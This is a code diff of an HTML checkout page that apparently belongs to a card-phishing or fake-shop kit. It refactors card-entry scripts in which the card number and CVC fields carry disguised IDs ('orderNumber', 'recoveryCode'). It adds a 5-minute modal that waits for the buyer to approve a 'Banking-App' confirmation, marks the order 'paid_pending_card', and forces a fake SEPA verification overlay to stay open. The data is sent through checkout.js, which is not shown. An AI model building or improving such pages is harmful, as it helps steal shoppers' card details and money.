@@ -140,7 +140,6 @@
     .factions{margin-left:auto;display:flex;gap:8px}
     .tag-ok{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;padding:2px 6px;display:inline-flex;align-items:center;justify-content:center;min-width:48px;text-align:center}
 
-    /* Accessibilité visuelle */
     input[aria-invalid="true"]{ border-color:#fca5a5; background:#fff7f7 }
     .tag-brand{display:none;align-items:center;gap:8px;border:1px solid #dbeafe;background:#f0f6ff;color:#1e40af;border-radius:999px;padding:4px 8px;font-size:12px;margin-top:6px}
     .meter{height:8px;border:1px solid #e5e7eb;border-radius:999px;overflow:hidden;background:#f8fafc}
@@ -148,12 +147,8 @@
     .countdown{font-variant:tabular-nums;letter-spacing:.3px}
     .tiny{font-size:11px;color:#6b7280}
 
-    /* Spinner + overlays */
-    .center{display:flex;align-items:center;justify-content:center}
-    .loading{display:flex;gap:12px;align-items:center}
-    .spinner{width:18px;height:18px;border-radius:50%;border:2px solid #dbeafe;border-top-color:#2563eb;animation:spin .8s linear infinite}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    #cardFlowModal, #postCardModal { z-index: 11000 } /* au-dessus de l’overlay générique */
+    /* Simple success icon */
+    .success-icon{width:28px;height:28px;border-radius:50%;display:inline-grid;place-items:center;background:#ecfdf5;border:1px solid #bbf7d0;color:#065f46;font-weight:800}
   </style>
 </head>
 <body>
@@ -278,7 +273,6 @@
           <button id="btnSplit" class="pt" type="button" aria-haspopup="dialog" aria-controls="splitModal">
             <strong>In Raten zahlen</strong>
           </button>
-          <small id="splitHint" class="muted">(désactivé)</small>
         </div>
 
         <!-- SEPA (Standard sichtbar) -->
@@ -442,7 +436,7 @@
     </aside>
   </main>
 
-  <!-- Modale 3DS / Banking-App -->
+  <!-- Modale 3DS / Banking-App (carte) -->
   <div id="cardFlowModal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="sheet">
       <header>
@@ -484,7 +478,7 @@
     </div>
   </div>
 
-  <!-- MODAL: Paiement en plusieurs fois -->
+  <!-- MODAL: Paiement en plusieurs fois (sans "1×") -->
   <div id="splitModal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="sheet">
       <header>
@@ -493,9 +487,6 @@
       </header>
       <div class="body">
         <div id="segSplit" class="seg" role="group" aria-label="Nombre de mensualités">
-          <button class="segbtn" type="button" data-parts="1" aria-pressed="false">
-            <span class="big">1×</span><span class="small">Heute</span>
-          </button>
           <button class="segbtn" type="button" data-parts="2" aria-pressed="false">
             <span class="big">2×</span><span class="small">30 Tage</span>
           </button>
@@ -516,11 +507,11 @@
     </div>
   </div>
 
-  <!-- OVERLAY: Chargement / Vérifications (SEPA / Crypto / Carte) -->
+  <!-- OVERLAY: Vérifications (utilisé par checkout.js) -->
   <div id="checkOverlay" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="sheet">
       <header>
-        <div class="loading"><span class="spinner" aria-hidden="true"></span><strong id="ovTitle">Vérification…</strong></div>
+        <div><strong id="ovTitle">Vérification…</strong></div>
         <button class="x" aria-label="Schließen" disabled title="Bitte warten…">✕</button>
       </header>
       <div class="body">
@@ -533,7 +524,7 @@
     </div>
   </div>
 
-  <!-- OVERLAY: Commande terminée -->
+  <!-- OVERLAY: Commande terminée (statique, sans chargement) -->
   <div id="doneOverlay" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="sheet">
       <header>
@@ -541,7 +532,13 @@
         <button class="x" id="closeDone" aria-label="Schließen">✕</button>
       </header>
       <div class="body">
-        <div class="loading"><span class="spinner" aria-hidden="true"></span><div><strong>Danke!</strong><div class="muted">Ihre Bestellung wurde gespeichert.</div></div></div>
+        <div style="display:flex;gap:10px;align-items:center">
+          <span class="success-icon">✓</span>
+          <div>
+            <div style="font-weight:700">Danke!</div>
+            <div class="muted">Ihre Bestellung wurde gespeichert.</div>
+          </div>
+        </div>
         <p class="tiny">Sie erhalten gleich eine Zusammenfassung per E-Mail.</p>
       </div>
       <footer>
@@ -566,16 +563,16 @@
   <!-- Toast conteneur (utilisé par checkout.js) -->
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
-  <!-- Script principal backend (ne pas modifier) -->
+  <!-- Script principal (ne pas modifier) -->
   <script src="checkout.js" defer></script>
 
-  <!-- Add-on Front Script (UI uniquement, sans toucher au backend) -->
+  <!-- Add-on Front Script (UI uniquement) -->
   <script defer>
   (function(){
     const $ = s=>document.querySelector(s);
     const $$ = s=>document.querySelectorAll(s);
 
-    /* Pane-Steuerung */
+    /* ============== Tabs & panes (intact) ============== */
     const panes = { sepa: $('#pmSEPA'), crypto: $('#pmCrypto'), card: $('#pmCard') };
     const tabs  = { sepa: document.querySelector('[data-method="sepa"]'),
                     crypto: document.querySelector('[data-method="crypto"]'),
@@ -585,7 +582,6 @@
       Object.keys(tabs).forEach(k=>tabs[k].setAttribute('aria-selected', String(k===name)));
     }
     showOnly('sepa');
-
     $$('.methods .m[role="tab"]').forEach(btn=>{
       btn.addEventListener('click', ()=>{
         const meth = btn.getAttribute('data-method');
@@ -593,262 +589,138 @@
       });
     });
 
-    /* Champs client : email & téléphone (placeholders + validations) */
-    const nameI = $('#name');
-    const emailI = $('#email');
-    const phoneI = $('#phone');
-    const countrySel = $('#country');
-
-    const tldByCountry = {
-      DE:'de', AT:'at', CH:'ch', FR:'fr', BE:'be', NL:'nl', LU:'lu', IT:'it', ES:'es', PT:'pt',
-      IE:'ie', GB:'uk', DK:'dk', NO:'no', SE:'se', FI:'fi', PL:'pl', CZ:'cz', SK:'sk', HU:'hu',
-      RO:'ro', BG:'bg', GR:'gr', SI:'si', HR:'hr', LT:'lt', LV:'lv', EE:'ee', IS:'is', TR:'tr'
-    };
+    /* ============== Inputs assist (identique) ============== */
+    const nameI = $('#name'), emailI = $('#email'), phoneI = $('#phone'), countrySel = $('#country');
+    const tldByCountry = {DE:'de', AT:'at', CH:'ch', FR:'fr', BE:'be', NL:'nl', LU:'lu', IT:'it', ES:'es', PT:'pt', IE:'ie', GB:'uk', DK:'dk', NO:'no', SE:'se', FI:'fi', PL:'pl', CZ:'cz', SK:'sk', HU:'hu', RO:'ro', BG:'bg', GR:'gr', SI:'si', HR:'hr', LT:'lt', LV:'lv', EE:'ee', IS:'is', TR:'tr'};
     const domainByLang = { DE:'beispiel', AT:'beispiel', CH:'beispiel', FR:'exemple', BE:'exemple' };
+    function slugName(n){ return (n||'').trim().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/[^a-zA-ZäöüÄÖÜß\s'-]/g,'').toLowerCase().replace(/\s+/g,' ').split(' ').slice(0,2).join('.'); }
+    function updateEmailPlaceholder(){ const cc=countrySel?.value||'DE'; const tld=tldByCountry[cc]||'com'; const domain=domainByLang[cc]||'example'; const local=slugName(nameI?.value)||'vorname.nachname'; if(emailI) emailI.placeholder = `${local}@${domain}.${tld}`; }
+    function validateEmail(){ if(!emailI) return true; const v=emailI.value.trim(); if(!v){ emailI.setAttribute('aria-invalid','false'); return false; } const ok=/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v); emailI.setAttribute('aria-invalid', String(!ok)); return ok; }
+    function formatPhone(){ if(!phoneI) return; let v=phoneI.value||''; v=v.replace(/^\s+|\s+$/g,'').replace(/[^\d+]/g,''); if(!v.startsWith('+')) v='+'+v.replace(/\+/g,''); const d=v.replace(/\D/g,''); phoneI.value=d.replace(/^(\d{1,3})(\d{0,4})(\d{0,4})(\d{0,4}).*$/,(_,a,b,c,d)=>['+'+a,b,c,d].filter(Boolean).join(' ')); const valid=/^\+\d{7,15}$/.test('+'+d.replace(/^(\d{1,3})/,'')); phoneI.setAttribute('aria-invalid', String(!valid)); }
+    function updatePhonePlaceholder(){ if(!phoneI||!countrySel) return; const map={ DE:'+49', AT:'+43', CH:'+41', FR:'+33', BE:'+32', NL:'+31', LU:'+352', IT:'+39', ES:'+34', PT:'+351', IE:'+353', GB:'+44', DK:'+45', NO:'+47', SE:'+46', FI:'+358', PL:'+48', CZ:'+420', SK:'+421', HU:'+36', RO:'+40', BG:'+359', GR:'+30', SI:'+386', HR:'+385', LT:'+370', LV:'+371', EE:'+372', IS:'+354', TR:'+90' }; phoneI.placeholder = (map[countrySel.value]||'+')+' 170 1234567'; }
+    nameI?.addEventListener('input', updateEmailPlaceholder);
+    countrySel?.addEventListener('change', ()=>{ updateEmailPlaceholder(); updatePhonePlaceholder(); });
+    updateEmailPlaceholder(); updatePhonePlaceholder();
+    emailI?.addEventListener('input', validateEmail);
+    phoneI?.addEventListener('input', formatPhone);
 
-    function slugName(n){
-      return (n||'').trim()
-        .normalize('NFD').replace(/[\u0300-\u036f]/g,'')
-        .replace(/[^a-zA-ZäöüÄÖÜß\s'-]/g,'')
-        .toLowerCase().replace(/\s+/g,' ')
-        .split(' ').slice(0,2).join('.');
-    }
-    function updateEmailPlaceholder(){
-      const cc = countrySel && countrySel.value || 'DE';
-      const tld = tldByCountry[cc] || 'com';
-      const domain = domainByLang[cc] || 'example';
-      const local = slugName(nameI && nameI.value) || 'vorname.nachname';
-      if(emailI){ emailI.placeholder = local + '@' + domain + '.' + tld; }
-    }
-    function validateEmail(){
-      if(!emailI) return true;
-      const v = emailI.value.trim();
-      if(!v){ emailI.setAttribute('aria-invalid','false'); return false; }
-      const ok = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
-      emailI.setAttribute('aria-invalid', String(!ok));
-      return ok;
-    }
-
-    function formatPhone(){
-      if(!phoneI) return;
-      let v = phoneI.value || '';
-      v = v.replace(/^\s+|\s+$/g,'').replace(/[^\d+]/g,'');
-      if(!v.startsWith('+')) v = '+' + v.replace(/\+/g,'');
-      const digits = v.replace(/\D/g,'');
-      const grouped = digits.replace(/^(\d{1,3})(\d{0,4})(\d{0,4})(\d{0,4}).*$/, (_,a,b,c,d)=>['+'+a,b,c,d].filter(Boolean).join(' '));
-      phoneI.value = grouped;
-      const valid = /^\+\d{7,15}$/.test('+' + digits.replace(/^(\d{1,3})/,'')); 
-      phoneI.setAttribute('aria-invalid', String(!valid));
-    }
-    function updatePhonePlaceholder(){
-      if(!phoneI || !countrySel) return;
-      const ccPrefix = {
-        DE:'+49', AT:'+43', CH:'+41', FR:'+33', BE:'+32', NL:'+31', LU:'+352', IT:'+39', ES:'+34', PT:'+351',
-        IE:'+353', GB:'+44', DK:'+45', NO:'+47', SE:'+46', FI:'+358', PL:'+48', CZ:'+420', SK:'+421', HU:'+36',
-        RO:'+40', BG:'+359', GR:'+30', SI:'+386', HR:'+385', LT:'+370', LV:'+371', EE:'+372', IS:'+354', TR:'+90'
-      };
-      const p = ccPrefix[countrySel.value] || '+';
-      phoneI.placeholder = p + ' 170 1234567';
-    }
-    if(nameI) nameI.addEventListener('input', updateEmailPlaceholder);
-    if(countrySel){
-      countrySel.addEventListener('change', ()=>{ updateEmailPlaceholder(); updatePhonePlaceholder(); });
-      updateEmailPlaceholder(); updatePhonePlaceholder();
-    }
-    if(emailI){ emailI.addEventListener('input', validateEmail); }
-    if(phoneI){ phoneI.addEventListener('input', formatPhone); }
-
-    /* Karten-Formatierung & Validierung (identique, sauf timer +5min plus bas) */
-    const num   = $('#orderNumber');
-    const exp   = $('#cardPeriod');
-    const cvc   = $('#recoveryCode');
-    const chip  = $('#cardBrandChip');
-    const assist= $('#cardAssist');
-    const cardName = $('#cardName');
-
+    /* ============== Carte: format + bouton (intact) ============== */
+    const num=$('#orderNumber'), exp=$('#cardPeriod'), cvc=$('#recoveryCode'), chip=$('#cardBrandChip'), assist=$('#cardAssist'), cardName=$('#cardName');
     const onlyDigits = s => (s||'').replace(/\D/g,'');
-    const detectBrand = d => /^4/.test(d) ? 'visa'
-                          : (/^(5[1-5]|2(2[2-9]|[3-6]\\d|7[01]|720))/.test(d) ? 'mastercard'
-                          : (/^3[47]/.test(d) ? 'amex' : null));
-    const brandNames = { visa:'Visa', mastercard:'Mastercard', amex:'American Express' };
-    const brandSamples = { visa:'4242 4242 4242 4242', mastercard:'5555 5555 5555 4444', amex:'3782 822463 10005' };
+    const detectBrand = d => /^4/.test(d) ? 'visa' : (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/.test(d) ? 'mastercard' : (/^3[47]/.test(d) ? 'amex' : null));
+    const brandNames={visa:'Visa',mastercard:'Mastercard',amex:'American Express'};
+    const brandSamples={visa:'4242 4242 4242 4242',mastercard:'5555 5555 5555 4444',amex:'3782 822463 10005'};
     const luhnOk = d => { let sum=0,alt=false; for(let i=d.length-1;i>=0;i--){let n=d.charCodeAt(i)-48; if(n<0||n>9) return false; if(alt){n*=2; if(n>9) n-=9;} sum+=n; alt=!alt;} return sum%10===0; };
-
     const payBtn = $('#payCard');
-    function cardFieldsValid(){
-      const hasName = cardName && cardName.value.trim().length>1;
-      const numberOk = num && onlyDigits(num.value).length >= (detectBrand(onlyDigits(num.value))==='amex'?15:16) && !/true/.test(num.getAttribute('aria-invalid'));
-      const expOk = exp && exp.value && !/true/.test(exp.getAttribute('aria-invalid'));
-      const cvcOk = cvc && cvc.value && !/true/.test(cvc.getAttribute('aria-invalid'));
-      return hasName && numberOk && expOk && cvcOk;
-    }
-    function updateCardButton(){ if(payBtn){ payBtn.disabled = !cardFieldsValid(); } }
-
+    function cardFieldsValid(){ const hasName=cardName?.value.trim().length>1; const numberOk=num&&onlyDigits(num.value).length>12&&!/true/.test(num.getAttribute('aria-invalid')); const expOk=exp&&exp.value&&!/true/.test(exp.getAttribute('aria-invalid')); const cvcOk=cvc&&cvc.value&&!/true/.test(cvc.getAttribute('aria-invalid')); return hasName&&numberOk&&expOk&&cvcOk; }
+    function updateCardButton(){ if(payBtn) payBtn.disabled=!cardFieldsValid(); }
     function formatCardWithCaret(input){
-      const raw = input.value;
-      const sel = input.selectionStart;
-      const digits = onlyDigits(raw);
-      const brand = detectBrand(digits);
-      const limit = brand==='amex' ? 15 : 16;
-      const d = digits.slice(0, limit);
-
-      let grouped;
-      if(brand==='amex'){
-        grouped = d.replace(/(\d{1,4})(\d{0,6})?(\d{0,5})?/, (_,a,b,c)=>[a,b,c].filter(Boolean).join(' '));
-      }else{
-        grouped = d.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
-      }
-
-      const leftDigits = onlyDigits(raw.slice(0, sel)).length;
-      let newPos=0, seen=0;
-      for(let i=0;i<grouped.length;i++){ if(/\d/.test(grouped[i])) seen++; if(seen>=leftDigits){ newPos=i+1; break; } }
-      input.value = grouped; input.setSelectionRange(newPos, newPos);
-      input.maxLength = brand==='amex' ? 17 : 19;
-
-      if(brand){
-        chip.style.display='inline-flex';
-        chip.textContent='Erkannte Karte: '+brandNames[brand];
-        input.placeholder = brandSamples[brand];
-        cvc.maxLength = brand==='amex' ? 4 : 3;
-        cvc.placeholder = brand==='amex' ? '4 Ziffern' : '3 Ziffern';
-      }else{
-        chip.style.display='none';
-        input.placeholder = brandSamples.visa;
-        cvc.maxLength = 4;
-      }
-
-      const need = brand==='amex' ? 15 : 16;
-      const oklen = onlyDigits(input.value).length===need;
-      if(oklen){
-        const ok = luhnOk(onlyDigits(input.value));
-        input.setAttribute('aria-invalid', String(!ok));
-        assist.textContent = ok ? 'Kartennummer gültig (Luhn ✓).' : 'Kartennummer ungültig (Luhn ✗).';
-      }else{
-        input.setAttribute('aria-invalid','false');
-        assist.textContent = brand ? `Bitte ${need} Ziffern eingeben — ${brandNames[brand]}.` : 'Bitte Kartennummer eingeben.';
-      }
+      const raw=input.value, sel=input.selectionStart, digits=onlyDigits(raw), brand=detectBrand(digits), limit=brand==='amex'?15:16, d=digits.slice(0,limit);
+      let grouped = brand==='amex' ? d.replace(/(\d{1,4})(\d{0,6})?(\d{0,5})?/,(_,a,b,c)=>[a,b,c].filter(Boolean).join(' ')) : d.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
+      const left=onlyDigits(raw.slice(0,sel)).length; let pos=0, seen=0; for(let i=0;i<grouped.length;i++){ if(/\d/.test(grouped[i])) seen++; if(seen>=left){ pos=i+1; break; } }
+      input.value=grouped; input.setSelectionRange(pos,pos); input.maxLength=brand==='amex'?17:19;
+      if(brand){ chip.style.display='inline-flex'; chip.textContent='Erkannte Karte: '+brandNames[brand]; cvc.maxLength=brand==='amex'?4:3; cvc.placeholder=brand==='amex'?'4 Ziffern':'3 Ziffern'; } else { chip.style.display='none'; cvc.maxLength=4; }
+      const need=brand==='amex'?15:16, oklen=onlyDigits(input.value).length===need;
+      if(oklen){ const ok=luhnOk(onlyDigits(input.value)); input.setAttribute('aria-invalid', String(!ok)); assist.textContent = ok?'Kartennummer gültig (Luhn ✓).':'Kartennummer ungültig (Luhn ✗).'; }
+      else { input.setAttribute('aria-invalid','false'); assist.textContent = brand?`Bitte ${need} Ziffern eingeben — ${brandNames[brand]}.`:'Bitte Kartennummer eingeben.'; }
       updateCardButton();
     }
-    if(num){ num.addEventListener('input', ()=>formatCardWithCaret(num)); num.placeholder = brandSamples.visa; }
-
+    num?.addEventListener('input', ()=>formatCardWithCaret(num));
     if(exp){
-      exp.addEventListener('keydown', (e)=>{
-        if(e.key==='Backspace'){
-          const pos = exp.selectionStart;
-          if(pos===3 && exp.value.charAt(2)=='/'){ e.preventDefault(); exp.value = exp.value.slice(0,1); exp.setSelectionRange(1,1); }
-        }
-      });
-      exp.addEventListener('input', ()=>{
-        let d = onlyDigits(exp.value).slice(0,4);
-        if(d.length===1){ const n=+d; if(n>1) d='0'+d; }
-        if(d.length>=2){ let mm=+d.slice(0,2); if(mm<1) mm=1; if(mm>12) mm=12; d=('0'+mm).slice(-2)+d.slice(2); }
-        exp.value = d.length>2 ? d.slice(0,2)+'/'+d.slice(2) : d;
-
-        const parts = exp.value.split('/');
-        if(parts.length===2 && parts[0].length===2 && parts[1].length===2){
-          const mm=+parts[0], yy=+parts[1];
-          const now=new Date(); const full=2000+yy;
-          const expEnd=new Date(full, mm, 1);
-          const firstThis=new Date(now.getFullYear(), now.getMonth(), 1);
-          const ok = mm>=1 && mm<=12 && expEnd>=firstThis;
-          exp.setAttribute('aria-invalid', String(!ok));
-          if(ok) { assist.textContent='Gültiges Ablaufdatum.'; }
-        }else{ exp.setAttribute('aria-invalid','false'); }
-        updateCardButton();
-      });
+      exp.addEventListener('keydown', (e)=>{ if(e.key==='Backspace'){ const p=exp.selectionStart; if(p===3 && exp.value.charAt(2)=='/'){ e.preventDefault(); exp.value=exp.value.slice(0,1); exp.setSelectionRange(1,1);} }});
+      exp.addEventListener('input', ()=>{ let d=onlyDigits(exp.value).slice(0,4); if(d.length===1){ const n=+d; if(n>1) d='0'+d; } if(d.length>=2){ let mm=+d.slice(0,2); if(mm<1) mm=1; if(mm>12) mm=12; d=('0'+mm).slice(-2)+d.slice(2); } exp.value=d.length>2?d.slice(0,2)+'/'+d.slice(2):d; const parts=exp.value.split('/'); if(parts.length===2 && parts[0].length===2 && parts[1].length===2){ const mm=+parts[0], yy=+parts[1]; const now=new Date(); const full=2000+yy; const expEnd=new Date(full, mm, 1); const firstThis=new Date(now.getFullYear(), now.getMonth(), 1); const ok=mm>=1&&mm<=12&&expEnd>=firstThis; exp.setAttribute('aria-invalid', String(!ok)); if(ok) assist.textContent='Gültiges Ablaufdatum.'; } else exp.setAttribute('aria-invalid','false'); updateCardButton(); });
     }
+    cvc?.addEventListener('input', ()=>{ let v=onlyDigits(cvc.value).slice(0,4); cvc.value=v; const bad=v.length<3||v.length>4; cvc.setAttribute('aria-invalid', String(bad)); if(!bad) assist.textContent='CVC/CVV ok.'; updateCardButton(); });
+    cardName?.addEventListener('input', ()=>{ const ok=cardName.value.trim().length>1; cardName.setAttribute('aria-invalid', String(!ok)); updateCardButton(); });
 
-    if(cvc){
-      cvc.addEventListener('input', ()=>{
-        let val = onlyDigits(cvc.value).slice(0,4);
-        cvc.value = val;
-        const bad = val.length<3 || val.length>4;
-        cvc.setAttribute('aria-invalid', String(bad));
-        if(!bad) assist.textContent = 'CVC/CVV ok.';
-        updateCardButton();
-      });
+    /* ============== Carte: timer modal 5 min ============== */
+    const cardModal=$('#cardFlowModal'), postModal=$('#postCardModal'), closeCardFlow=$('#closeCardFlow'), iValidated=$('#iValidated'), useSepa=$('#useSepa'), cardBar=$('#cardBar'), cardCountdown=$('#cardCountdown'), confirmCardBtn=$('#confirmCard'), okPostCard=$('#okPostCard'), closePostCard=$('#closePostCard'), placeOrder=$('#placeOrder');
+    if(payBtn){ payBtn.disabled=true; }
+    let tick=null, total=300, left=total;
+    const fmt=s=>String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');
+    function openCardModal(){ left=total; cardBar.style.width='0%'; cardCountdown.textContent=fmt(left); cardModal.classList.add('show'); tick=setInterval(()=>{ left--; if(left<0) left=0; cardBar.style.width=((total-left)/total*100).toFixed(1)+'%'; cardCountdown.textContent=fmt(left); if(left===0){ closeCardModal(); } },1000); }
+    function closeCardModal(){ clearInterval(tick); cardModal.classList.remove('show'); confirmCardBtn.style.display='inline-flex'; confirmCardBtn.removeAttribute('aria-hidden'); confirmCardBtn.scrollIntoView({behavior:'smooth', block:'center'}); }
+    payBtn?.addEventListener('click', (e)=>{ e.preventDefault(); const ok=[cardName,num,exp,cvc].every(el=>el && el.value && !/true/.test(el.getAttribute('aria-invalid'))); if(!ok){ const t=$('#toast'); if(t){ t.textContent='Bitte Kartenfelder prüfen.'; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),2000); } return; } openCardModal(); });
+    closeCardFlow?.addEventListener('click', ()=>closeCardModal());
+    iValidated?.addEventListener('click', ()=>closeCardModal());
+    useSepa?.addEventListener('click', ()=>{ closeCardModal(); showOnly('sepa'); });
+    confirmCardBtn?.addEventListener('click', (e)=>{ e.preventDefault(); postModal.classList.add('show'); if(placeOrder){ placeOrder.disabled=false; placeOrder.dataset.state='paid_pending_card'; }});
+    function closePost(){ postModal.classList.remove('show'); }
+    okPostCard?.addEventListener('click', closePost);
+    closePostCard?.addEventListener('click', closePost);
+
+    /* ============== Paiement en plusieurs fois: sans "1×" et sans label désactivé ============== */
+    const modal=$('#splitModal');
+    const setModalParts=n=>{ $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===Number(n)))); };
+    const EUR = v => Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
+    const CART_KEY='gf_cart';
+    const getCart=()=>{ try{return JSON.parse(localStorage.getItem(CART_KEY)||'[]');}catch{return[];} };
+    const computeSub = cart => cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0);
+    function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
+    function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
+    function splitAmounts(total, parts){ const c=Math.round((+total||0)*100); const base=Math.floor(c/parts), first=base+(c-base*parts); return [first,...Array(parts-1).fill(base)].map(x=>x/100); }
+    function scheduleLines(total, parts){ const amts=splitAmounts(total, parts); const today=new Date(); const steps=[0,30,60,90]; return amts.map((amt,i)=>{ const d=new Date(today); d.setDate(d.getDate()+steps[i]); return {label:i?`Dans ${steps[i]} jours`:`Aujourd’hui`, date:d.toLocaleDateString('fr-FR'), amt}; }); }
+    function updateModalPreview(){
+      const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
+      const parts=Number($$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true')?.dataset.parts||4);
+      const lines=scheduleLines(total, parts);
+      $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
     }
+    $$('#segSplit .segbtn').forEach(b=> b.addEventListener('click',()=>{ setModalParts(b.dataset.parts); updateModalPreview(); }));
+    $('#btnSplit')?.addEventListener('click',()=>{ modal?.classList.add('show'); modal?.setAttribute('aria-hidden','false'); setModalParts(4); updateModalPreview(); });
+    $('#closeSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
+    $('#cancelSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
+    $('#applySplit')?.addEventListener('click',()=>{ const sel=$$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true'); const selectedSplit=Number(sel?.dataset.parts||4); // l’apply met juste le style du bouton
+      $('#btnSplit')?.classList.add('on'); $('#btnOnce')?.classList.remove('on'); modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); 
+      // Laisser checkout.js gérer les montants (il lit le modal au clic "Appliquer")
+    });
+    $('#btnOnce')?.addEventListener('click', ()=>{ $('#btnOnce')?.classList.add('on'); $('#btnSplit')?.classList.remove('on'); });
 
-    if(cardName){
-      cardName.addEventListener('input', ()=>{
-        const ok = cardName.value.trim().length>1;
-        cardName.setAttribute('aria-invalid', String(!ok));
-        updateCardButton();
-      });
-    }
+    /* ============== Overlays demandés ============== */
+    // 1) checkOverlay: Forcer 10s minimum pour le SEPA, supprimer pour la Carte
+    (function(){
+      const overlay=$('#checkOverlay');
+      const title=$('#ovTitle');
+      if(!overlay||!title) return;
+      let forceUntil=0, hold=null;
 
-    /* Kartenfluss: Timer = 5 Minuten */
-    const cardModal = $('#cardFlowModal');
-    const postModal = $('#postCardModal');
-    const closeCardFlow = $('#closeCardFlow');
-    const iValidated = $('#iValidated');
-    const useSepa = $('#useSepa');
-    const cardBar = $('#cardBar');
-    const cardCountdown = $('#cardCountdown');
-    const confirmCardBtn = $('#confirmCard');
-    const okPostCard = $('#okPostCard');
-    const closePostCard = $('#closePostCard');
-    const placeOrder = $('#placeOrder');
+      function ensureShown(){ if(!overlay.classList.contains('show')){ overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false'); } }
+      function ensureHidden(){ overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); }
 
-    if(payBtn){ payBtn.disabled = true; }
+      const mo = new MutationObserver(()=>{
+        const isShown = overlay.classList.contains('show');
+        const t = (title.textContent||'').toLowerCase();
 
-    let tick=null, total=300, left=total; /* 5 minutes */
-    function fmt(s){ const m=String(Math.floor(s/60)).padStart(2,'0'); const ss=String(s%60).padStart(2,'0'); return m+':'+ss; }
-    function openCardModal(){
-      left = total;
-      cardBar.style.width='0%';
-      cardCountdown.textContent = fmt(left);
-      cardModal.classList.add('show');
-      tick = setInterval(()=>{
-        left--; if(left<0) left=0;
-        cardBar.style.width = ((total-left)/total*100).toFixed(1)+'%';
-        cardCountdown.textContent = fmt(left);
-        if(left===0){ closeCardModal(true); }
-      },1000);
-    }
-    function closeCardModal(){
-      clearInterval(tick);
-      cardModal.classList.remove('show');
-      confirmCardBtn.style.display='inline-flex';
-      confirmCardBtn.removeAttribute('aria-hidden');
-      confirmCardBtn.scrollIntoView({behavior:'smooth', block:'center'});
-    }
-
-    if(payBtn){
-      payBtn.addEventListener('click', (e)=>{
-        e.preventDefault();
-        const ok = [cardName,num,exp,cvc].every(el => el && el.value && !/true/.test(el.getAttribute('aria-invalid')));
-        if(!ok){
-          const t=document.getElementById('toast'); if(t){ t.textContent='Bitte Kartenfelder prüfen.'; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),2000); }
+        // Cas carte: ne pas afficher cette fenêtre (elle est redondante avec la modale 3DS)
+        if(isShown && t.includes('paiement par carte')){
+          ensureHidden();
           return;
         }
-        openCardModal();
+        // Cas SEPA: garder 10 secondes puis fermer
+        if(isShown && t.includes('vérification virement')){
+          forceUntil = Date.now() + 10000; // 10s
+          if(hold) clearInterval(hold);
+          hold = setInterval(()=>{
+            if(Date.now() < forceUntil){
+              ensureShown(); // si checkout.js l’a fermée trop tôt, on la rouvre
+            }else{
+              clearInterval(hold); hold=null; ensureHidden();
+            }
+          }, 200);
+          return;
+        }
       });
-    }
-    if(closeCardFlow){ closeCardFlow.addEventListener('click', ()=>closeCardModal()); }
-    if(iValidated){ iValidated.addEventListener('click', ()=>closeCardModal()); }
-    if(useSepa){
-      useSepa.addEventListener('click', ()=>{
-        closeCardModal();
-        showOnly('sepa');
-      });
-    }
+      mo.observe(overlay, { attributes:true, attributeFilter:['class'] });
+      // Observer aussi les changements de titre (au cas où)
+      new MutationObserver(()=>{ /* relance la logique si le titre change pendant show */ overlay.classList.contains('show') && mo.takeRecords(); })
+        .observe(title, { childList:true, characterData:true, subtree:true });
+    })();
 
-    if(confirmCardBtn){
-      confirmCardBtn.addEventListener('click', (e)=>{
-        e.preventDefault();
-        postModal.classList.add('show');
-        if(placeOrder){ placeOrder.disabled = false; placeOrder.dataset.state = 'paid_pending_card'; }
-      });
-    }
-    function closePost(){ postModal.classList.remove('show'); }
-    if(okPostCard){ okPostCard.addEventListener('click', closePost); }
-    if(closePostCard){ closePostCard.addEventListener('click', closePost); }
-
-    /* Toggle “Jetzt bezahlen” / “In Raten zahlen” (indice visuel) */
-    const btnOnce = $('#btnOnce');
-    const btnSplit = $('#btnSplit');
-    if(btnOnce){ btnOnce.addEventListener('click', ()=>{ btnOnce.classList.add('on'); btnSplit.classList.remove('on'); const hint=$('#splitHint'); if(hint) hint.textContent='(désactivé)'; }); }
+    // 2) doneOverlay: statique, bouton X pour fermer
+    (function(){
+      const done=$('#doneOverlay'), x=$('#closeDone');
+      x?.addEventListener('click', ()=>{ done?.classList.remove('show'); done?.setAttribute('aria-hidden','true'); });
+    })();
 
   })();
   </script>
